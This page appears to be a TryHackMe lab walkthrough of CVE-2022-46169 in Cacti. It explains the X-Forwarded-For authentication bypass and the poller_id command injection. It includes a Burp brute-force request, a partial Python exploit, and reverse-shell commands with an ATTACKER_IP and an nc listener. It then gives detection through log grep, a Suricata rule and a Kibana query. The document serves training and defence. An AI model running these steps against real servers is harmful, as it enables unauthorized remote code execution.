    <li class="md-nav__item">
      <a href="../../../../links/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Links
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_13">
        
          
          <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    About
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_13">
            <span class="md-nav__icon md-icon"></span>
            
  
    About
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../about/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    About
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              
                




              
              <article class="md-content__inner md-typeset">
                
                  


  
  


<h1 id="one-oftryhackmescenarioscve-2022-46169">One of:TryHackMe:Scenarios:CVE-2022-46169<a class="headerlink" href="#one-oftryhackmescenarioscve-2022-46169" title="Permanent link">¶</a></h1>
<p><code>Consider It as an Ethical Hacking!</code></p>
<h2 id="star">STAR<a class="headerlink" href="#star" title="Permanent link">¶</a></h2>
<table>
<thead>
<tr>
<th><strong>STAR Element</strong></th>
<th><strong>Details</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Situation</strong></td>
<td>- A critical vulnerability (CVE-2022-46169) was identified in Cacti versions &lt;= 1.2.22 that allowed remote attackers to bypass authentication and perform <strong>Remote Code Execution (RCE)</strong> via <code>remote_agent.php</code>.</td>
</tr>
<tr>
<td></td>
<td>- The key flaws were in Cacti's handling of client IP validation (bypass via HTTP header manipulation) and insufficient sanitization of user inputs in <code>poller_id</code>.</td>
</tr>
<tr>
<td><strong>Task</strong></td>
<td>- Understand and emulate the exploitation process. <br> - Extract valid parameters for <code>host_id</code>, <code>poller_id</code>, and <code>local_data_ids</code>. <br> - Exploit the endpoint to gain unauthorized access.<br> - Execute arbitrary OS commands to trigger RCE.</td>
</tr>
<tr>
<td><strong>Action</strong></td>
<td>- Authentication Bypass: Use the <code>X-Forwarded-For</code> HTTP header to spoof the client IP and bypass <code>remote_client_authorized()</code> verification.</td>
</tr>
<tr>
<td></td>
<td>- Parameter Discovery: Brute-force valid IDs (<code>host_id</code>, <code>local_data_ids</code>) using tools like Burp Suite Intruder.</td>
</tr>
<tr>
<td></td>
<td>- Crafted Command Exploitation: Send a malicious payload in the <code>poller_id</code> parameter and execute through the <code>proc_open</code> function in <code>remote_agent.php</code>.</td>
</tr>
<tr>
<td></td>
<td>- Reverse Shell: Craft an exploit to execute a reverse shell payload for remote system access.</td>
</tr>
<tr>
<td><strong>Result</strong></td>
<td>- <strong>Successful Authentication Bypass</strong>: Manipulation of the <code>X-Forwarded-For</code> header allowed unauthorized access to <code>remote_agent.php</code>.</td>
</tr>
<tr>
<td></td>
<td>- <strong>Remote Code Execution</strong>: Achieved RCE by leveraging the unsanitized <code>poller_id</code> parameter to inject OS commands (e.g., spawn a reverse shell).</td>
</tr>
<tr>
<td></td>
<td>- <strong>Defense Tactics Proposed</strong>: Monitored exploitation through Apache logs, detected IoCs using Suricata rules, and observed malicious events in Kibana. Applied security patches to fix input validation and sanitize code.</td>
</tr>
</tbody>
</table>
<h2 id="walk-through">Walk-Through<a class="headerlink" href="#walk-through" title="Permanent link">¶</a></h2>
<h3 id="emulate-the-exploitation-of-a-vulnerable-cacti-instance">Emulate the exploitation of a vulnerable Cacti instance<a class="headerlink" href="#emulate-the-exploitation-of-a-vulnerable-cacti-instance" title="Permanent link">¶</a></h3>
<h4 id="step-1">Step 1<a class="headerlink" href="#step-1" title="Permanent link">¶</a></h4>
<table>
<thead>
<tr>
<th><strong>Topic</strong></th>
<th><strong>Details</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Exploitation</strong></td>
<td><strong>Authentication Bypass</strong>: Vulnerability CVE-2022-46169 enables an attacker to bypass authentication &amp; execute arbitrary code remotely on Cacti v1.2.22. It resides in <code>remote_agent.php</code> and exploits IP address manipulation to bypass host validation.</td>
</tr>
<tr>
<td><strong>File</strong>: <code>remote_agent.php</code></td>
<td>The file implements an authorization check using <code>remote_client_authorized()</code> to verify whether the client is authorized to access the service.</td>
</tr>
<tr>
<td><strong>File</strong>: <code>lib/html_utility.php</code></td>
<td>The <code>remote_client_authorized()</code> function retrieves the client's IP address and hostname, then compares the hostname to entries in the poller table to verify authenticity.</td>
</tr>
<tr>
<td><strong>File</strong>: <code>lib/functions.php</code></td>
<td>The <code>get_client_addr()</code> function fetches the client's IP address using headers like <code>X-Forwarded-For</code>, which can be manipulated by attackers.</td>
</tr>
<tr>
<td><strong>Authentication Bypass Technique</strong></td>
<td>By manipulating the <code>X-Forwarded-For</code> HTTP header to match an entry in the poller table, the <code>remote_client_authorized()</code> function can be tricked into authorizing the attacker.</td>
</tr>
<tr>
<td><strong>Example Request</strong> (without <code>X-Forwarded-For</code>)</td>
<td>Requests without the <code>X-Forwarded-For</code> header will fail to authenticate unless the source IP naturally matches a poller table entry.</td>
</tr>
<tr>
<td><strong>Example Request</strong> (with <code>X-Forwarded-For</code>)</td>
<td>Adding the <code>X-Forwarded-For</code> HTTP header with a manipulated value (such as the server's own IP) can bypass authentication checks if the server hostname is found in the poller table.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="code-snippets">Code Snippets<a class="headerlink" href="#code-snippets" title="Permanent link">¶</a></h3>
<h4 id="authorization-verification-in-remote_agentphp">Authorization Verification in <code>remote_agent.php</code><a class="headerlink" href="#authorization-verification-in-remote_agentphp" title="Permanent link">¶</a></h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">if (!remote_client_authorized()) {</span>
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="x">   ...</span>
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="x">}</span>
</code></pre></div>
<h4 id="function-remote_client_authorized-in-libhtml_utilityphp">Function: <code>remote_client_authorized()</code> in <code>lib/html_utility.php</code><a class="headerlink" href="#function-remote_client_authorized-in-libhtml_utilityphp" title="Permanent link">¶</a></h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="x">function remote_client_authorized() {</span>
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="x">   ..</span>
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="x">}</span>
</code></pre></div>
<h4 id="function-get_client_addr-in-libfunctionsphp">Function: <code>get_client_addr()</code> in <code>lib/functions.php</code><a class="headerlink" href="#function-get_client_addr-in-libfunctionsphp" title="Permanent link">¶</a></h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="x">function get_client_addr($client_addr = false) {</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="x">    $http_addr_headers = array(</span>
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="x">        'HTTP_X_FORWARDED',</span>
<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="x">        'HTTP_X_FORWARDED_FOR',</span>
<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="x">        'HTTP_X_CLUSTER_CLIENT_IP',</span>
<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="x">        'HTTP_FORWARDED_FOR',</span>
<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="x">        'HTTP_FORWARDED',</span>
<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="x">        'HTTP_CLIENT_IP',</span>
<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="x">        'REMOTE_ADDR',</span>
<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="x">    );</span>
<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>
<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="x">    $client_addr = false;</span>
<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="x">    foreach ($http_addr_headers as $header) {</span>
<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="x">        if (isset($_SERVER[$header])) {</span>
<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="x">            $header_ips = explode(',', $_SERVER[$header]); // Handle multiple comma-separated IPs</span>
<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="x">            foreach ($header_ips as $header_ip) {</span>
<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="x">             ...</span>
<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="x">                break 2;</span>
<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="x">            }</span>
<a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="x">        }</span>
<a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="x">    }</span>
<a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="x">    return $client_addr;</span>
<a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="x">}</span>
</code></pre></div>
<hr>
<p>By leveraging the <code>X-Forwarded-For</code> HTTP header to match an entry in the <code>poller</code> table, attackers can exploit this code to bypass authentication and gain unauthorized access.</p>
<hr>
<h4 id="step-2">Step 2<a class="headerlink" href="#step-2" title="Permanent link">¶</a></h4>
<table>
<thead>
<tr>
<th><strong>Topic</strong></th>
<th><strong>Details</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Exploitation</strong></td>
<td><strong>Command Injection</strong>: Vulnerability related to the <code>poller_item</code> and its <code>action</code> parameter in <code>remote_agent.php</code>. This allows attackers to execute arbitrary commands via crafted <code>poller_id</code> input.</td>
</tr>
<tr>
<td><strong>File</strong>: <code>remote_agent.php</code></td>
<td>The file contains actionable code linked to poller items. An unsanitized <code>poller_id</code> parameter pairs with the <code>action</code> parameter (<code>POLLER_ACTION_SCRIPT_PHP</code>) to allow command injection through <code>proc_open</code>.</td>
</tr>
<tr>
<td><strong>Injection Initiation</strong></td>
<td>The vulnerability begins in the <code>poll_for_data()</code> function. While <code>host_id</code> is sanitized using <code>get_filter_request_var</code>, the <code>poller_id</code> parameter is fetched using <code>get_nfilter_request_var</code>, which does not sanitize input and allows arbitrary strings.</td>
</tr>
<tr>
<td><strong>Command Execution Context</strong></td>
<td>When the <code>action</code> parameter is set to <code>polldata</code>, <code>poll_for_data()</code> fetches poller items. If the action of one item is set to <code>POLLER_ACTION_SCRIPT_PHP</code>, the <code>poller_id</code> value is passed to <code>proc_open</code>, enabling injection.</td>
</tr>
<tr>
<td><strong>Validating Parameters</strong></td>
<td><code>host_id</code> and <code>local_data_ids</code> can be brute-forced using tools like Burp Suite Intruder via iterating numbers until valid identifiers are discovered. This allows attackers to retrieve correct IDs for leveraging the vulnerability.</td>
</tr>
<tr>
<td><strong>Remote Code Execution</strong></td>
<td>After parameter validation, attackers can execute remote code by sending crafted requests using the discovered <code>host_id</code> and <code>local_data_ids</code>. A reverse shell can be spawned by injecting a payload via the vulnerable endpoint.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="code-snippets_1">Code Snippets<a class="headerlink" href="#code-snippets_1" title="Permanent link">¶</a></h3>
<h4 id="vulnerable-poll_for_data-function-in-remote_agentphp">Vulnerable <code>poll_for_data()</code> Function in <code>remote_agent.php</code><a class="headerlink" href="#vulnerable-poll_for_data-function-in-remote_agentphp" title="Permanent link">¶</a></h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="x">function poll_for_data() {</span>
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="x">    // Fetch parameters</span>
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="x">    $host_id   = get_filter_request_var('host_id'); // Sanitized</span>
<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="x">    $poller_id = get_nfilter_request_var('poller_id'); // Unsanitized</span>
<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="x">    // Fetch poller items</span>
<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="x">    // ...</span>
<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="x">    foreach ($items as $item) {</span>
<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="x">        switch ($item['action']) {</span>
<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="x">            case POLLER_ACTION_SCRIPT_PHP:  // Executes if poller action is PHP script</span>
<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="x">                $cactiphp = proc_open(</span>
<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="x">                    read_config_option('path_php_binary') . ' -q ' .</span>
<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="x">                  ...</span>
<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="x">                    $cactides,</span>
<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="x">                    $pipes</span>
<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="x">                );</span>
<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="x">                // ...</span>
<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="x">        }</span>
<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="x">    }</span>
<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="x">}</span>
</code></pre></div>
<h4 id="burp-suite-request-example-for-brute-forcing-parameters">Burp Suite Request Example for Brute-Forcing Parameters<a class="headerlink" href="#burp-suite-request-example-for-brute-forcing-parameters" title="Permanent link">¶</a></h4>
<p>Exec follow http req is not require but we can use it for testing in burp suit bacause follow req is mentioned by code in the next section which mentioned <a href="https://www.exploit-db.com/exploits/51166">exploit</a>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nf">GET</span> <span class="nn">/cacti/remote_agent.php?action=polldata&amp;local_data_ids[]=§1§&amp;host_id=§1§&amp;poller_id=1</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">10.10.48.31</span>
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="na">X-Forwarded-For</span><span class="o">:</span> <span class="l">127.0.0.1</span>
<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="na">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36</span>
<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.9</span>
<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="na">Cookie</span><span class="o">:</span> <span class="l">Cacti=asokjqjpteiq57e71...</span>
<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
</code></pre></div>
<h4 id="python-exploit-code-snippet-exploitpy">Python Exploit Code Snippet (<code>exploit.py</code>)<a class="headerlink" href="#python-exploit-code-snippet-exploitpy" title="Permanent link">¶</a></h4>
<p>Get the file from <a href="https://www.exploit-db.com/exploits/51166">exploit</a>.</p>
<p><strong>Note</strong>: Do not forget to change <code>X-Forwarded-For': '127.0.0.1</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">class</span><span class="w"> </span><span class="nc">Exploit</span><span class="p">:</span>
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">proxy</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">rs_host</span><span class="o">=</span><span class="s2">""</span><span class="p">,</span> <span class="n">rs_port</span><span class="o">=</span><span class="s2">""</span><span class="p">):</span>
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">httpx</span><span class="o">.</span><span class="n">Client</span><span class="p">(</span><span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">"User-Agent"</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">random_user_agent</span><span class="p">()},</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">)</span>
<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">rs_host</span> <span class="o">=</span> <span class="n">rs_host</span>
<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">rs_port</span> <span class="o">=</span> <span class="n">rs_port</span>
<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>
<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>        <span class="n">local_cacti_ip</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"//"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>            <span class="s1">'X-Forwarded-For'</span><span class="p">:</span> <span class="s1">'127.0.0.1'</span>
<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>        <span class="p">}</span>
<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>        <span class="c1"># Additional exploitation logic...</span>
</code></pre></div>
<h4 id="reverse-shell-exploitation-example">Reverse Shell Exploitation Example<a class="headerlink" href="#reverse-shell-exploitation-example" title="Permanent link">¶</a></h4>
<p>Run the exploit after modifying the necessary fields in the script:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">ATTACKER_MACHINE_LISTENING_PORT</span><span class="o">=</span><span class="m">443</span>
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">ATTACKER_IP</span><span class="o">=</span><span class="w"> </span><span class="m">10</span>.10.53.158
<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>python3<span class="w"> </span><span class="m">51166</span>.py<span class="w"> </span>-u<span class="w"> </span>http://ip/cacti/<span class="w"> </span>-i<span class="w"> </span>ATTACKER_IP<span class="w"> </span>-p<span class="w"> </span>ATTACKER_MACHINE_LISTENING_PORT
</code></pre></div>
<p>Set up a Netcat listener to catch the reverse shell:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>nc<span class="w"> </span>-nlvp<span class="w"> </span><span class="m">443</span>
</code></pre></div>
<p>Once successful, the reverse shell connection is established with administrative privileges.</p>
<hr>
<p>By carefully analyzing the parameters and leveraging tools like Burp Suite Intruder for brute-forcing, attackers can identify valid <code>host_id</code> and <code>local_data_ids</code> to successfully exploit the vulnerability and achieve Remote Code Execution (RCE).</p>
<h4 id="step-3">Step 3<a class="headerlink" href="#step-3" title="Permanent link">¶</a></h4>
<p><strong>Log Analysis and Alerting</strong></p>
<hr>
<h3 id="extracting-information-from-logs-using-grep"><strong>Extracting Information from Logs Using <code>grep</code></strong><a class="headerlink" href="#extracting-information-from-logs-using-grep" title="Permanent link">¶</a></h3>
<table>
<thead>
<tr>
<th>Step</th>
<th>Details</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Locate Apache Logs</strong></td>
<td>- <strong>Debian/Ubuntu</strong>: Logs at <code>/var/log/apache2/access.log</code> <br> - <strong>CentOS/RHEL</strong>: Logs at <code>/var/log/httpd/access.log</code></td>
</tr>
<tr>
<td><strong>Search for Patterns</strong></td>
<td>- Exploits leave patterns that deviate from normal user behavior.</td>
</tr>
<tr>
<td><strong>IoC-based Search Queries</strong></td>
<td>- Search example: <code>grep 'remote_agent.php' /var/log/httpd/access.log</code></td>
</tr>
<tr>
<td><strong>Search by Date/Time</strong></td>
<td>- Find logs around specific times. <br> Example: <code>grep '20/Jul/2023' /var/log/httpd/access_log</code></td>
</tr>
</tbody>
</table>
<hr>
<h3 id="generating-alerts-for-cve-2022-46169-exploitation-using-suricata"><strong>Generating Alerts for CVE-2022-46169 Exploitation Using Suricata</strong><a class="headerlink" href="#generating-alerts-for-cve-2022-46169-exploitation-using-suricata" title="Permanent link">¶</a></h3>
<p><strong>0. Writing Rule</strong></p>
<p>Create a new file cacti_exploit.rules:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>alert http any any -&gt; $HOME_NET any (msg:"CVE-2022-46169 Cacti Exploit Attempt"; content:"GET"; http_method; content:"/remote_agent.php"; http_uri; content:"action=polldata"; http_uri; content:"poller_id="; http_uri; pcre:"/bash|sh|powershell|cmd/"; flowbits:set,CVE-2022-46169-attempt; metadata:created_at 2023_07_21, updated_at 2023_07_21; classtype:web-application-attack; sid:1000001; rev:2;)
</code></pre></div>
<table>
<thead>
<tr>
<th><strong>Step</strong></th>
<th><strong>Command or Configuration</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>1.File to Modify</strong></td>
<td><code>/etc/suricata/rules/cacti_exploit.rules</code></td>
<td>Save the rule in Suricata's custom rules directory.</td>
</tr>
<tr>
<td><strong>2. Update Config</strong></td>
<td>Edit the Suricata YAML configuration file (<code>/etc/suricata/suricata.yaml</code>): <br> <code>default-rule-path: /etc/suricata/rules rule-files: - cacti_exploit.rules - suricata.rules</code></td>
<td>Add the new rule file to Suricata's configuration to ensure it gets loaded.</td>
</tr>
<tr>
<td><strong>3. Restart Suricata</strong></td>
<td><code>sudo systemctl restart suricata</code></td>
<td>Restart the Suricata service to apply changes made to the rules.</td>
</tr>
<tr>
<td><strong>4. Monitor Alerts</strong></td>
<td><code>tail -f /var/log/suricata/fast.log</code></td>
<td>Continuously monitor Suricata's fast log for real-time alerts generated by the new rule.</td>
</tr>
<tr>
<td><strong>5. Respond to Alerts</strong></td>
<td>Analyze alerts for potential exploitation attempts. Identify and mitigate threats by blocking malicious source IPs at the firewall.</td>
<td>Take proactive measures to enhance security by responding to alerts promptly.</td>
</tr>
</tbody>
</table>
<hr>
<ul>
<li><code>/var/lib/suricata/rules</code> original value of default-path-rule that must be replaced with <code>/etc/suricata/rules</code>.</li>
</ul>
<p>If you spot any alerts, it indicates potential exploitation attempts. Review the alerts, identify the source IP addresses, and consider blocking them at the firewall level or taking other necessary security measures.</p>
<h3 id="workflow-recap"><strong>Workflow Recap</strong><a class="headerlink" href="#workflow-recap" title="Permanent link">¶</a></h3>
<table>
<thead>
<tr>
<th>Step</th>
<th>Action</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Detect IoCs in Logs</strong></td>
<td>Search Apache logs using <code>grep</code> for patterns or timestamps corresponding to suspicious activity.</td>
</tr>
<tr>
<td><strong>Set Up Suricata Rule</strong></td>
<td>Create a custom rule to detect CVE-2022-46169 exploitation.</td>
</tr>
<tr>
<td><strong>Update Configuration File</strong></td>
<td>Edit Suricata's configuration to include the custom rule.</td>
</tr>
<tr>
<td><strong>Restart Suricata</strong></td>
<td>Apply the new configuration by restarting Suricata.</td>
</tr>
<tr>
<td><strong>Monitor Alerts</strong></td>
<td>Use Suricata logs (e.g., <code>fast.log</code>) to spot and analyze exploitation attempts.</td>
</tr>
<tr>
<td><strong>Respond to Alerts</strong></td>
<td>Act on alerts by isolating, blocking malicious IPs, and investigating further.</td>
</tr>
</tbody>
</table>
<p><strong>Note</strong>: we found the flag of task 4 quesions: <code>base64-decoded flag being submitted by this adversary?</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>cat<span class="w"> </span>access_log_<span class="o">{</span>date<span class="o">}</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>flag
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>GET<span class="w"> </span>/cacti/log/index.php<span class="w"> </span><span class="c1">#... decode showed code to base64</span>
</code></pre></div>
<h3 id="step-4">Step 4<a class="headerlink" href="#step-4" title="Permanent link">¶</a></h3>
<p><strong>Investigating Events Through Kibana</strong></p>
<table>
<thead>
<tr>
<th><strong>Step</strong></th>
<th><strong>Details</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>1. Access Kibana</strong></td>
<td>Open Kibana at <code>http://MACHINE_IP:5601</code> using your AttackBox browser.</td>
</tr>
<tr>
<td><strong>2. Navigate to Discover</strong></td>
<td>- Click on the <strong>left sidebar</strong> (highlight <a class="magiclink magiclink-github magiclink-issue" href="https://github.com/armanriazi/armanriazi.github.io/issues/1" title="GitHub Issue: armanriazi/armanriazi.github.io #1">#1</a>).<br>- Click <strong>Discover</strong> (highlight <a class="magiclink magiclink-github magiclink-issue" href="https://github.com/armanriazi/armanriazi.github.io/issues/2" title="GitHub Issue: armanriazi/armanriazi.github.io #2">#2</a>).</td>
</tr>
<tr>
<td><strong>3. Use Query for CVE-2022-46169</strong></td>
<td>Copy and paste the following query string in the search field to detect suspicious events:</td>
</tr>
<tr>
<td><strong>Query String</strong></td>
<td><code>http.request.method:"GET" AND url.original:*remote_agent.php* AND url.query:*action=polldata* AND url.query:*poller_id=* AND url.query:(*bash* OR *sh* OR *powershell* OR *cmd*))</code></td>
</tr>
<tr>
<td><strong>Query Explanation</strong></td>
<td>- Searches for <strong>HTTP GET</strong> requests to <code>remote_agent.php</code>.<br>- Checks for <strong>query parameters</strong>: <code>action=polldata</code>, <code>poller_id=</code>.<br>- Checks for potential commands: <code>bash</code>, <code>sh</code>, <code>powershell</code>, <code>cmd</code>.</td>
</tr>
<tr>
<td><strong>4. Configure Discover View</strong></td>
